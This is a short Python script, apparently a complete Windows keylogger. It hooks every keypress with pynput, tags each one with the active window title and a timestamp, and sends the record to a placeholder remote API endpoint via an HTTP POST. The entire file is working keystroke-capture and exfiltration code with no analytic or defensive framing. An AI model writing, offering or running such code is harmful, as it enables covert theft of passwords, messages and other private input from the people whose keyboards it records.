from pynput import keyboard
import win32gui
from datetime import datetime
import requests

def catch(key):
    """
    transmit keystrokes to an API endpoint
    callback function for keyboard listener
    """
    if key == keyboard.Key.esc:
        return False

    # fetch the app name where keypress happened
    window = win32gui.GetForegroundWindow()
    window_name = win32gui.GetWindowText(window)

    # transmit key, app name, and time
    response = requests.post(
        "<YOUR API ENDPOINT>",
        json={
            "time": datetime.now().isoformat(),
            "window": window_name,
            "keypress": str(key)
        },
        timeout=10
    )

# start keyboard press event listener
keyboard.Listener(on_press=catch).run()